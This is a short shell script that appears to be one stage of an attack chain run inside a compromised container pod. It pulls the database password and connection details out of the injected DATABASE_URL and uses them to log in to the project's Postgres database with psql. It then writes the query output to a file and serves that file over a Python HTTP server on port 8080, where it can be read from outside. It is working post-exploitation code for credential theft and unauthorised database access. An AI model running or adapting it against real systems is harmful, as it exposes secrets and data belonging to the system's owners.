#!/bin/sh
# S14 ULTIMATE: pod root -> psql via injected DATABASE_URL -> read project DB
{
  echo "=== POD ==="
  id; hostname
  echo "=== PG CONNECT (injected DATABASE_URL) ==="
  if [ -n "$DATABASE_URL" ]; then
    echo "url host: $(echo $DATABASE_URL | cut -d@ -f2 | cut -d/ -f1)"
    PGPASSWORD=$(echo $DATABASE_URL | sed -n 's|.*:.*://[^:]*:\([^@]*\)@.*|\1|p')
    PGB=$(echo $DATABASE_URL | cut -d@ -f2 | cut -d: -f1)
    PGPORT=$(echo $DATABASE_URL | cut -d@ -f2 | cut -d/ -f1 | cut -d: -f2)
    PGDATABASE=$(echo $DATABASE_URL | cut -d/ -f3)
    echo "user=avnadmin host=$PGB port=$PGPORT db=$PGDATABASE pwlen=${#PGPASSWORD}"
    timeout 15 psql "host=$PGB port=$PGPORT user=avnadmin dbname=$PGDATABASE sslmode=require" -c "SELECT current_user, version(); SELECT count(*) AS tables FROM information_schema.tables WHERE table_schema='public';" 2>&1 | head -25
  else
    echo "NO DATABASE_URL"
  fi
} > /app/chain4.txt 2>&1
printf 'CHAIN4 host=%s uid=%s\n' "$(hostname)" "$(id -u)" > /app/index.html
exec python3 -m http.server 8080
